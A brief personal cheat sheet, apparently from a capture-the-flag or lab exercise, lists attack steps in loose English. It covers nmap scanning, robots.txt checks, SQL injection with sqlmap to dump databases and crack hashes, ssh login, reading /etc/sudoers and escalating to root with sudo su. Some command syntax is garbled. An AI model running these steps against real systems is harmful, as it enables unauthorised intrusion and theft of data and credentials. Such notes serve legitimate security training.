

## nmap
obtain data of port
```console
nmap -A ip
```

## Robots.txt
Posible data info
ip/robots.txt See data

## id
After ip/page.html?parameters=values&others=value
if id mod id = 2'

## sqlmap
obtain data from sql
```console
sqlmap -u "urlwithparameters delete %27 end" -p "parameterVulnerable" --dbms=DataBaseEngine(MySQL) --dbs
Enter [Y/N]
```

ignore information schema, mysql and test are natural

Obtain info of important database
```console
sqlmap -u "urlwithparameters delete %27 end" -D Databasetoanalize --tables --dump
Store hashes Y
use dictionary Enter
Common pasword sufizes Y

```

## ssh
access
```console
ssh user@ip
psw: password
```

## Privileges
see acces of users
```console
sudo cat /etc/sudoers
```

## Change acount
Select acount to use
```console
sudo su -
```

https://www.youtube.com/watch?v=r_M2oDc93fI